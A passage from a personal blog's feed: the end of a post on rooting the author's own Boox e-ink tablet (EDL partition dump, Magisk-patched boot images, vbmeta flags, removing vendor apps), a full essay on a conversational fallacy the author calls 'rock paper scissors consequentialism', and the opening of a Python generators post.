plain">cmnlib_a:            Offset 0x0000000015f86000, Length 0x0000000000080000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cmnlib64_a:          Offset 0x0000000016006000, Length 0x0000000000080000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">devcfg_a:            Offset 0x0000000016086000, Length 0x0000000000020000, Flags 0x0040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">qupfw_a:             Offset 0x00000000160a6000, Length 0x0000000000010000, Flags 0x0040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">vbmeta_a:            Offset 0x00000000160b6000, Length 0x0000000000010000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dtbo_a:              Offset 0x00000000160c6000, Length 0x0000000001800000, Flags 0x0040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">imagefv_a:           Offset 0x00000000178c6000, Length 0x0000000000200000, Flags 0x0040000000000001, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uefisecapp_a:        Offset 0x0000000017ac6000, Length 0x0000000000200000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">featenabler_a:       Offset 0x0000000017cc6000, Length 0x0000000000020000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">multiimgoem_a:       Offset 0x0000000017ce6000, Length 0x0000000000008000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rpm_b:               Offset 0x0000000017cee000, Length 0x0000000000080000, Flags 0x007f000000000000, UUID ####################################, Type #########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tz_b:                Offset 0x0000000017d6e000, Length 0x0000000000400000, Flags 0x007f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hyp_b:               Offset 0x000000001816e000, Length 0x0000000000080000, Flags 0x007f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">modem_b:             Offset 0x00000000181ee000, Length 0x000000000b400000, Flags 0x107f000000000000, UUID ####################################, Type ##############, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluetooth_b:         Offset 0x00000000235ee000, Length 0x0000000000100000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mdtpsecapp_b:        Offset 0x00000000236ee000, Length 0x0000000000400000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mdtp_b:              Offset 0x0000000023aee000, Length 0x0000000002000000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">abl_b:               Offset 0x0000000025aee000, Length 0x0000000000100000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dsp_b:               Offset 0x0000000025bee000, Length 0x0000000002000000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">keymaster_b:         Offset 0x0000000027bee000, Length 0x0000000000080000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">boot_b:              Offset 0x0000000027c6e000, Length 0x0000000006000000, Flags 0x0077000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cmnlib_b:            Offset 0x000000002dc6e000, Length 0x0000000000080000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cmnlib64_b:          Offset 0x000000002dcee000, Length 0x0000000000080000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">devcfg_b:            Offset 0x000000002dd6e000, Length 0x0000000000020000, Flags 0x007f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">qupfw_b:             Offset 0x000000002dd8e000, Length 0x0000000000010000, Flags 0x007f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">vbmeta_b:            Offset 0x000000002dd9e000, Length 0x0000000000010000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dtbo_b:              Offset 0x000000002ddae000, Length 0x0000000001800000, Flags 0x007f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">featenabler_b:       Offset 0x000000002f5ae000, Length 0x0000000000020000, Flags 0x0004000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">imagefv_b:           Offset 0x000000002f5ce000, Length 0x0000000000200000, Flags 0x007f000000000001, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uefisecapp_b:        Offset 0x000000002f7ce000, Length 0x0000000000200000, Flags 0x0004000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">multiimgoem_b:       Offset 0x000000002f9ce000, Length 0x0000000000008000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">devinfo:             Offset 0x000000002f9d6000, Length 0x0000000000001000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dip:                 Offset 0x000000002f9d7000, Length 0x0000000000100000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">apdp:                Offset 0x000000002fad7000, Length 0x0000000000040000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">spunvm:              Offset 0x000000002fb17000, Length 0x0000000000800000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">splash:              Offset 0x0000000030317000, Length 0x00000000020a4000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">limits:              Offset 0x00000000323bb000, Length 0x0000000000001000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">toolsfv:             Offset 0x00000000323bc000, Length 0x0000000000100000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logfs:               Offset 0x00000000324bc000, Length 0x0000000000800000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cateloader:          Offset 0x0000000032cbc000, Length 0x0000000000200000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rawdump:             Offset 0x0000000032ebc000, Length 0x0000000008000000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logdump:             Offset 0x000000003aebc000, Length 0x0000000004000000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">storsec:             Offset 0x000000003eebc000, Length 0x0000000000020000, Flags 0x1000000000000000, UUID ####################################, Type #########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">multiimgqti:         Offset 0x000000003eedc000, Length 0x0000000000008000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uefivarstore:        Offset 0x000000003eee4000, Length 0x0000000000080000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">secdata:             Offset 0x000000003ef64000, Length 0x0000000000007000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">catefv:              Offset 0x000000003ef6b000, Length 0x0000000000080000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">catecontentfv:       Offset 0x000000003efeb000, Length 0x0000000000100000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Total disk size:0x0000000100000000, sectors:0x0000000000100000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Parsing Lun 5:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GPT Table:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ALIGN_TO_128K_2:     Offset 0x0000000000006000, Length 0x000000000001a000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">modemst1:            Offset 0x0000000000020000, Length 0x0000000000200000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">modemst2:            Offset 0x0000000000220000, Length 0x0000000000200000, Flags 0x0000000000000000, UUID ####################################, Type #########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fsg:                 Offset 0x0000000000420000, Length 0x0000000000200000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fsc:                 Offset 0x0000000000620000, Length 0x0000000000020000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Total disk size:0x0000000008000000, sectors:0x0000000000008000</span><br></span></code></pre></div></div></div></div></details>
<p>From here, we just read out all the requisite images for us to patch:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">mkdir extracted_edl_20250809</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd extracted_edl_20250809</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">edl --loader sm6225.bin r boot_a,boot_b,vbmeta_a,vbmeta_b boot_a.img,boot_b.img,vbmeta_a.img,vbmeta_b.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">edl reset</span><br></span></code></pre></div></div>
<p>Then after the device as rebooted, we can copy <code>boot_a.img</code> and <code>boot_b.img</code> into the device, disconnect from the computer, and follow the Magisk patching instructions.</p>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>warning</div><div class="admonitionContent_BuS1"><p>From here it's important to NOT confuse the two partitions in the output files!</p><p>I renamed each Magisk patched output as it was produced, to prefix the partition: <code>boot_a_magisk_patched-29000_IsHAi.img</code> and <code>boot_b_magisk_patched-29000_2zita.img</code></p></div></div>
<p>Finally, in order to use the patched boot images, we can set relevant flags in the VBMeta (verified boot metadata) images by <a href="https://github.com/zoomver/Vbmeta" target="_blank" rel="noopener noreferrer">using this script</a> to modify them in place:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">python patch-vbmeta.py vbmeta_a.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python patch-vbmeta.py vbmeta_b.img</span><br></span></code></pre></div></div>
<p>Finally, we need to flash these all back to the device, so back to EDL mode we go!</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">adb reboot edl</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">edl --loader sm6225.bin w boot_a extracted_edl_20250809/boot_a_magisk_patched-29000_IsHAi.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">edl --loader sm6225.bin w boot_b extracted_edl_20250809/boot_b_magisk_patched-29000_2zita.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">edl --loader sm6225.bin w vbmeta_a extracted_edl_20250809/vbmeta_a.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">edl --loader sm6225.bin w vbmeta_b extracted_edl_20250809/vbmeta_b.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">edl reset</span><br></span></code></pre></div></div>
<p>And upon reboot, Magisk confirms the rooted image was booted successfully.</p>
<p>Additional resources used:</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="system-modifications">System Modifications<a href="https://clifford.ressel.fyi/blog/eink-tablet-part1#system-modifications" class="hash-link" aria-label="Direct link to System Modifications" title="Direct link to System Modifications">​</a></h2>
<p>At this point, to make the device a bit more trusted I worked through the following steps:</p>
<ul>
<li>Add a Magisk DenyList, blocking almost all apps for su access</li>
<li>AFWall+, blocking all Onyx apps from network traffic</li>
<li>Disable Onyx apps via <code>adb shell pm clear $PKG_NAME &amp;&amp; adb shell pm disable-user $PKG_NAME</code></li>
<li>Neo Backup for all apps</li>
<li>Remove Onyx apps via <code>adb shell pm uninstall --user 0 $PKG_NAME</code></li>
</ul>
<p>And for reference, at the time of writing it appears that the tablet ships with the following Boox-modified apps:</p>
<ul>
<li><code>com.android.quicksearchbox</code></li>
<li><code>org.chromium.chrome</code></li>
<li>every "onyx" app</li>
</ul>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary><p><code>adb shell pm list packages | grep onyx</code></p></summary><div><div class="collapsibleContent_i85q"><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.android.internal.systemui.navbar.gestural_onyx</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.dict</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.kime</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.mail</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.android.onyxotaservice</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.clock</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.igetshop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.android.production.test</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.latinime</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.musicplayer</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.android.ksync</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.easytransfer</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.kreader</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.android.note</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.gallery</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.floatingbutton</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.tscalibration</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.aiassistant</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.voicerecorder</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.appmarket</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">package:com.onyx.calculator</span><br></span></code></pre></div></div></div></div></details>
<p>Of course there are several, deeper modifications made within the Boox ROM, given many of the UI elements that are still present (such as the overriden utility dropdown, the E Ink specific app configuration, and the lock screen).
But that's a good start, and opens up much deeper system access!</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Rock paper scissors consequentialism]]></title>
            <link>https://clifford.ressel.fyi/blog/rps-consequentialism</link>
            <guid>https://clifford.ressel.fyi/blog/rps-consequentialism</guid>
            <pubDate>Tue, 29 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[I've noticed that with big topics about societal issues or values, there are often three types of conversations:]]></description>
            <content:encoded><![CDATA[<p>I've noticed that with big topics about societal issues or values, there are often three types of conversations:</p>
<ol>
<li>There are conversations about where we are at.</li>
<li>There are conversations about where we should go.</li>
<li>There are conversations about how to get there.</li>
</ol>
<p>Type 1 is to be a descriptive conversation, about what is. Type 2 is a normative conversation, about what should be. Type 3 is usually a constructive conversation, about what's effective.</p>
<p>Several times, this mental model helped me understand the root cause of disagreements that were otherwise difficult to pinpoint.
I have seen discussions get heated, despite 90%+ common ground within each of these areas, because there was disagreement about <strong>what the stakes of the argument ought to be</strong>.
The conflict wasn't about about the facts brought to the table, it was about whether to frame this as "where we are at," vs. "where we should go," vs. "how to get there."</p>
<p>To take a pretty sanguine example: let's say Alice wants to talk whether recent tech acquisitions are anti-competitive (type 1), but Bob tries to reframe it as whether Alice wants more or less FTC intervention (type 3), and he clearly doesn't engage with her original point.
Someone trying to reframing the conversation into their preferred terrain is often motivated by a genuine vision of what a more productive, society-wide conversation looks like.
However, when it is twisted too far, it becomes "I want to avoid that point, because conceding it will have consequences to my own framing of the topic," and the reframing descends to a fallacy of appealing to consequences.
Here are some common ways I see this reframing tactic carried out:</p>
<ul>
<li>Attacking type 1: <strong>You can't talk about problems until you have solutions to propose</strong>
<ul>
<li>There are issues in society forever and always, and since we can't discuss them all, then you must talk about the ones that we can fix.</li>
</ul>
</li>
<li>Attacking type 2: <strong>You can't talk about "ought" until we talk more about "is"</strong>
<ul>
<li>Too much conversation about an ideal, perfect future takes away from the current day issues that we haven't yet fully acknowledged as a group.</li>
</ul>
</li>
<li>Attacking type 3: <strong>You can't disagree on "how" without sabotaging our "ought"</strong>
<ul>
<li>If you disagree with the efficacy of any particular policy, then you're endangering the desirability of our shared goal in the minds of others.</li>
</ul>
</li>
</ul>
<p>Notice that all three of these lines of argumentation use tenuous appeals to consequences.
It would be fine to expand the conversation to a discussion of wider import, but it's ridiculous to suggest that the original point cannot be spoken about because of these second or third order effects.
Usually the perpetrator of this tactic is unshakeably focused on the battlegrounds of their own opinion.
In the previous example, Bob cannot talk about anti-trust without bringing up whether Lina Khan is a net positive or negative.
To Bob, just entertaining the topic in someone else's framing feels like a consequential illocutionary act that gives up ground to an opposing side (one who may not even be part of the conversation!).</p>
<p>Some quick examples can make these lines of argumentation more concrete.
This may also irritate anyone who disagrees with particular premises or conclusions, so strap in, and please put on your good faith discourse hat!
I'm sure I could make a similar argument in the opposite direction for most of the below opinions, but I'm trying to focus on the structure of the rational, and not the specifics of these issues.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="you-cant-talk-about-problems-until-you-have-solutions-to-propose">You can't talk about problems until you have solutions to propose<a href="https://clifford.ressel.fyi/blog/rps-consequentialism#you-cant-talk-about-problems-until-you-have-solutions-to-propose" class="hash-link" aria-label="Direct link to You can't talk about problems until you have solutions to propose" title="Direct link to You can't talk about problems until you have solutions to propose">​</a></h2>
<p>Often when income inequality is observed as a growing problem (a type 1 discussion), more neoliberal or fiscally-conservative folks bristle at a perceived attack on how the current, nominally capitalist economic system is organized to maximize prosperity (a type 3 reframing).
If someone is noting an issue with inequality, will they next disagree with an open, market-based system that relies on some amount of inequality? Are they demanding a change without any suggestions for a better approach?
Anyone pointing to these problems of inequality is frequently dismissed as being idealistic, or promoting a vision that disrupts a wider status quo.
In reality the specifics of their criticism may be quite targeted and not be accompanied by any prescription, nor do they need one to be valid.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="you-cant-talk-about-ought-until-we-talk-more-about-is">You can't talk about "ought" until we talk more about "is"<a href="https://clifford.ressel.fyi/blog/rps-consequentialism#you-cant-talk-about-ought-until-we-talk-more-about-is" class="hash-link" aria-label="Direct link to You can't talk about &quot;ought&quot; until we talk more about &quot;is&quot;" title="Direct link to You can't talk about &quot;ought&quot; until we talk more about &quot;is&quot;">​</a></h2>
<p>During the racial reckoning, attempts to talk about a future with color blind equality (a type 2 discussion) were frequently shot down for calling into question what is a current, racially unequal reality (a type 1 reframing).
I have been in a conversation that went something like this: someone mentioned how great a future world would be, if race was as much thought about as hair color currently is.
Three other folks at the table exchanged looks, and then began attacking the stakes of the discussion itself.
Is it even fair to compare hair color to skin color, in a world where the inequities of race are still so pressing? Despite the dogpile discussion, I don't think that anyone there would disagree with Dr.
King's original sentiment, to "look to a day when people will not be judged by the color of their skin." I assume that to those three opponents in the discussion, even holding a conversation about the <em>existence</em> of that future felt like it robs the current issues of their impetus and necessity.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="you-cant-disagree-on-how-without-sabotaging-our-ought">You can't disagree on "how" without sabotaging our "ought"<a href="https://clifford.ressel.fyi/blog/rps-consequentialism#you-cant-disagree-on-how-without-sabotaging-our-ought" class="hash-link" aria-label="Direct link to You can't disagree on &quot;how&quot; without sabotaging our &quot;ought&quot;" title="Direct link to You can't disagree on &quot;how&quot; without sabotaging our &quot;ought&quot;">​</a></h2>
<p>When concerns of implementation and efficacy are raised (a type 3 discussion), I've experienced the shoutdown for being perceived as a threat to a shared goal (a type 2 reframing).
When discussing the solutions to rising cost and access barriers within higher education, I see clear economic reasons to question the effectiveness of student debt forgiveness without other, more fundamental interventions first<sup><a href="https://clifford.ressel.fyi/blog/rps-consequentialism#user-content-fn-1-66349f" id="user-content-fnref-1-66349f" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup>.
I don't think someone who stakes out a position of unilateral student loan forgiveness has different goals: widespread access to education and opportunity, decreasing the barrier of rising educational costs, and freeing debt-burdened adults to have greater financial freedom and future prosperity.
But any daylight between opinions about <strong>efficacy</strong> is treated as damaging to the overall goals.
Even worse yet, this easily escalates to questioning of intentions: If you really knew how important these goals were, if you genuinely wanted to accomplish them, would you be raising tough questions?
Potentially giving ammunition to "the other side"?
Any defense you mount that tries to explain this distinction is less clear and convincing than the simple line of attack.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="where-from-here">Where from here<a href="https://clifford.ressel.fyi/blog/rps-consequentialism#where-from-here" class="hash-link" aria-label="Direct link to Where from here" title="Direct link to Where from here">​</a></h2>
<p>Let me try and find a catchy call for action here.
Divisive disagreements have been all the rage (literally) in the U.S. for over ten years now.
My preference after observing the pitfalls above, is to try and avoid them both when used against me, and also as they apply to my own thinking.
For example, I often find myself the victim of the second and third attempts of reframing, but most often prone to perpetrating the first kind in responding to others.
If you're in discussion with me and you notice this, please call it out! "I notice you're reacting to effects of a solution I wasn't even advocating," is a great way to head off that pitfall of discussion.</p>
<p>I also have tried my hand at naming this conversational anti-pattern, similar to some other informal fallacy names<sup><a href="https://clifford.ressel.fyi/blog/rps-consequentialism#user-content-fn-2-66349f" id="user-content-fnref-2-66349f" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup>.
<strong>I think of this as "rock paper scissors consequentialism."</strong>
It is much like an appeal to consequences, and when used to distract from the previous discussion then it is clearly a type of red herring.
More specifically though, the circular way that this reframing can be used is like rock paper scissors: whatever the stakes of the argument you set forth, if I change the stakes to my preferred terrain then your argument looks like it yields objectionable conclusions.<sup><a href="https://clifford.ressel.fyi/blog/rps-consequentialism#user-content-fn-3-66349f" id="user-content-fnref-3-66349f" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup></p>
<p>If you discuss big values issues frequently or intensely with friends, colleagues, or the internet (ranked in the order that I would recommend), maybe share this mental model with them.
Hopefully a shared meta-awareness for the "stakes" of a discussion is a helpful tool, especially when those stakes evolve or get called into question throughout the discussion.</p>
<!-- -->
<section data-footnotes="true" class="footnotes"><h2 class="anchor anchorWithStickyNavbar_LWe7 sr-only" id="footnote-label">Footnotes<a href="https://clifford.ressel.fyi/blog/rps-consequentialism#footnote-label" class="hash-link" aria-label="Direct link to Footnotes" title="Direct link to Footnotes">​</a></h2>
<ol>
<li id="user-content-fn-1-66349f">
<p>This falls prey to: 1. moral hazard, 2. subsidizing consumption while restricting supply, 3. regressively transferring wealth. Assuming no other long-term interventions are involved, widespread student loan forgiveness may actually <em>raise</em> cost over the long-term, and <em>decrease</em> access to higher education in the long-term. <a href="https://clifford.ressel.fyi/blog/rps-consequentialism#user-content-fnref-1-66349f" data-footnote-backref="" aria-label="Back to reference 1" class="data-footnote-backref">↩</a></p>
</li>
<li id="user-content-fn-2-66349f">
<p>These illustrative names excited me most when I read about the <a href="https://en.wikipedia.org/wiki/Motte-and-bailey_fallacy" target="_blank" rel="noopener noreferrer">motte-and-bailey fallacy</a> for the first time. With how vivid the term is, the tactic becomes tough to miss. <a href="https://clifford.ressel.fyi/blog/rps-consequentialism#user-content-fnref-2-66349f" data-footnote-backref="" aria-label="Back to reference 2" class="data-footnote-backref">↩</a></p>
</li>
<li id="user-content-fn-3-66349f">
<p>It's also worth noting that some legs of this tactic feel very similar to a moralistic fallacy. <a href="https://clifford.ressel.fyi/blog/rps-consequentialism#user-content-fnref-3-66349f" data-footnote-backref="" aria-label="Back to reference 3" class="data-footnote-backref">↩</a></p>
</li>
</ol>
</section>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Learning generators part 2: In depth]]></title>
            <link>https://clifford.ressel.fyi/blog/python-generators-part2</link>
            <guid>https://clifford.ressel.fyi/blog/python-generators-part2</guid>
            <pubDate>Fri, 11 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[How generators can be used in four ways (from simple to complex):]]></description>
            <content:encoded><![CDATA[<p>How generators can be used in four ways (from simple to complex):</p>
<ol>
<li>Lazy-like expressions, including unbounded sequences</li>
<li>Alternating control flow with the caller</li>
<li><strong>A "pure-looking" function, with hidden internal state</strong></li>
<li><strong>Internally managing a state-machine, that handles caller-passed input</strong></li>
</ol>
<p>The first two use cases are covered <a href="https://clifford.ressel.fyi/blog/python-generators-part1">this previous article</a>, and serve as a primer to the topic.
If you don't have a solid understanding of generators in Python, I would recommend starting there.</p>
<p>The second two use cases are covered in this article.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>Well that's a big gap in time between these two articles!</p><p>A peak behind the screen -- I speed wrote the first article and outlined the
second, immediately after doing some small projects and consuming some related
tech talks. This past month I was able to clean up this section, and finally
click publish on both!</p></div></div>
<hr>
